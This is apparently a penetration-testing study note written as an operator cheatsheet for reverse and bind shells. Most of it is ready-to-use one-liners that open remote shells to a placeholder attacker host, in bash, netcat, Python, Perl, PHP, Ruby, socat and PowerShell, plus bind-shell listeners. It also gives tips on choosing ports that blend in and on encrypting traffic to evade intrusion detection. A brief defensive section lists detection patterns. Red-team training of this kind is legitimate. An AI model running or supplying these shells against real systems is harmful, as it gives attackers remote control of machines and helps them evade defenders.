---
tags: [tools, shells, post-exploitation, pentesting, red-team]
difficulty: intermediate
module: "46 - Operator Technique Cheatsheets"
topic: "46.01 Reverse and Bind Shell Cheatsheet"
---

# Reverse and Bind Shell Cheatsheet

## Introduction
Getting a command shell back from a target is the pivot point between "I have code execution" and "I have an interactive session." This note is an operator cheatsheet for **reverse shells** (target connects out to you — the default choice, since outbound traffic is usually less filtered) and **bind shells** (target listens, you connect in — used when you can't receive inbound, e.g. you're behind NAT and the target is reachable). It complements the per-tool references for [[52 - Netcat nc ncat Swiss Army Knife]], [[53 - Socat Advanced Netcat Replacement]], and [[49 - Msfvenom Payload Generation Reference]].

## Reverse vs Bind — Pick the Right One
```text
+---------------------------------------------------------------+
|  REVERSE SHELL (default)        |  BIND SHELL                  |
|  target --connect-->  attacker  |  attacker --connect--> target|
|  good: egress allowed, NAT'd    |  good: you can't receive in, |
|        attacker                 |        target has open port  |
|  listener: nc -lvnp 443         |  payload listens on target   |
+---------------------------------------------------------------+
```
Start your listener first (reverse), e.g. `nc -lvnp 443` or `rlwrap nc -lvnp 443` (readline = arrow keys/history).

## Listener Setup
```bash
nc -lvnp 443                      # basic
rlwrap nc -lvnp 443               # better line editing
# socat listener (gives a fuller PTY directly — see TTY note)
socat -d -d TCP-LISTEN:443,reuseaddr,fork STDOUT
```

## Linux Reverse Shells (one-liners)
```bash
# bash (most common)
bash -i >& /dev/tcp/ATTACKER/443 0>&1
bash -c 'bash -i >& /dev/tcp/ATTACKER/443 0>&1'
# sh (fallback when bash absent)
sh -i >& /dev/tcp/ATTACKER/443 0>&1
# nc (no -e) FIFO trick
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ATTACKER 443 >/tmp/f
# nc with -e (ncat/openbsd-traditional)
nc -e /bin/sh ATTACKER 443
# python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",443));[os.dup2(s.fileno(),f) for f in(0,1,2)];subprocess.call(["/bin/bash","-i"])'
# perl / php / ruby
perl -e 'use Socket;$i="ATTACKER";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'
php -r '$s=fsockopen("ATTACKER",443);exec("/bin/sh -i <&3 >&3 2>&3");'
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("ATTACKER",443);loop{c.puts `#{c.gets.chomp}`}'
# socat (full PTY in one shot)
socat TCP:ATTACKER:443 EXEC:'bash -li',pty,stderr,setsid,sigint,sane
```

## Windows Reverse Shells
```powershell
# PowerShell one-liner (TCP)
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('ATTACKER',443);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sby=([Text.Encoding]::ASCII).GetBytes($sb2);$s.Write($sby,0,$sby.Length);$s.Flush()}"
```
```cmd
:: nc.exe / ncat on target
nc.exe ATTACKER 443 -e cmd.exe
```
For staged/encoded Windows payloads and EXE/DLL/HTA formats, generate with [[49 - Msfvenom Payload Generation Reference]].

## Bind Shells
```bash
# Linux bind (target listens on 4444)
nc -lvnp 4444 -e /bin/sh
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc -lvnp 4444 >/tmp/f
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sane
```
```powershell
# then you connect:  nc TARGET 4444
```

## Operational Tips
- **Port choice:** use **443/80/53** — commonly allowed outbound and blend with normal traffic.
- **Stability:** raw `nc` shells are fragile (no job control, Ctrl-C kills them). Upgrade immediately — see [[02 - Upgrading to a Full Interactive TTY]].
- **Encryption:** prefer `socat` OPENSSL or msfvenom TLS payloads to evade plaintext IDS signatures.
- **Egress filtering:** if direct connect-back fails, tunnel the callback (see [[03 - Tunneling and Port Forwarding]]) or expose your listener (see [[08 - Exposing Local Services to the Internet]]).

## Why It Matters
Reverse/bind shells are the universal payload of post-exploitation; knowing several language variants means you can always find one whose interpreter exists on the target, and choosing reverse-vs-bind correctly for the network topology is the difference between a working callback and a silent failure.

## Defensive Notes
- **Egress filtering / proxy enforcement** kills naive reverse shells; alert on outbound to odd ports and on shells with network sockets (`bash`/`python` with a TCP connection).
- Monitor for `/dev/tcp` usage, `nc -e`, `mkfifo` + `nc` patterns, and PowerShell `TCPClient`.
- EDR: flag interpreters spawning shells and unusual parent-child chains.

## Related Notes
- [[02 - Upgrading to a Full Interactive TTY]]
- [[03 - Tunneling and Port Forwarding]]
- [[49 - Msfvenom Payload Generation Reference]]
- [[52 - Netcat nc ncat Swiss Army Knife]]
- [[53 - Socat Advanced Netcat Replacement]]
